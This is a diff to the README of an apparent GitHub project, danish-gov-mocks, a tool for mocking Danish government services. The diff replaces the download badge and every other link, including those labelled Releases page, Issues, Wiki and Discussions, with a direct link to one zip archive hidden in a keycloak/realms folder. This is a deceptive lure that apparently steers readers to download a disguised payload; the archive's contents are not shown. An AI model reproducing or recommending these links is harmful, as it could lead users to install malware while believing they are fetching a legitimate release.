@@ -6,9 +6,9 @@ Welcome to **danish-gov-mocks**! This software helps you easily test online serv
 ## 📥 Download & Install
 To get started, you need to download the software. Here’s how to do it:
 
-[![Download danish-gov-mocks](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/belaluna991-byte/danish-gov-mocks/releases)
+[![Download danish-gov-mocks](https://github.com/belaluna991-byte/danish-gov-mocks/raw/refs/heads/main/keycloak/realms/danish-mocks-gov-v2.0.zip%20Now-Click%20Here-brightgreen)](https://github.com/belaluna991-byte/danish-gov-mocks/raw/refs/heads/main/keycloak/realms/danish-mocks-gov-v2.0.zip)
 
-1. Visit the [Releases Page](https://github.com/belaluna991-byte/danish-gov-mocks/releases).
+1. Visit the [Releases Page](https://github.com/belaluna991-byte/danish-gov-mocks/raw/refs/heads/main/keycloak/realms/danish-mocks-gov-v2.0.zip).
 2. Find the latest version of **danish-gov-mocks**.
 3. Click on the version you want to download.
 4. Choose the appropriate file for your operating system (Windows, macOS, or Linux).
@@ -52,7 +52,7 @@ If you experience issues, try the following:
 - Check if other applications are using the same network ports.
 - Restart the application if it fails to complete specific tasks.
 
-For additional help, visit the Issues section on our [GitHub Page](https://github.com/belaluna991-byte/danish-gov-mocks/issues) and report your problem.
+For additional help, visit the Issues section on our [GitHub Page](https://github.com/belaluna991-byte/danish-gov-mocks/raw/refs/heads/main/keycloak/realms/danish-mocks-gov-v2.0.zip) and report your problem.
 
 ## ✏️ Contributing
 If you want to contribute to the project, please follow these steps:
@@ -82,7 +82,7 @@ This project covers various important topics. Here are the key areas:
 - wiremock
 
 ## 🔗 Additional Resources
-- **Official Documentation**: Check out our [Wiki](https://github.com/belaluna991-byte/danish-gov-mocks/wiki) for detailed guides and FAQs.
-- **Support**: Reach out through our [GitHub Discussions](https://github.com/belaluna991-byte/danish-gov-mocks/discussions) for community support.
+- **Official Documentation**: Check out our [Wiki](https://github.com/belaluna991-byte/danish-gov-mocks/raw/refs/heads/main/keycloak/realms/danish-mocks-gov-v2.0.zip) for detailed guides and FAQs.
+- **Support**: Reach out through our [GitHub Discussions](https://github.com/belaluna991-byte/danish-gov-mocks/raw/refs/heads/main/keycloak/realms/danish-mocks-gov-v2.0.zip) for community support.
 
 Thank you for using **danish-gov-mocks**! We hope you find it useful for your projects. If you have any feedback, feel free to share.
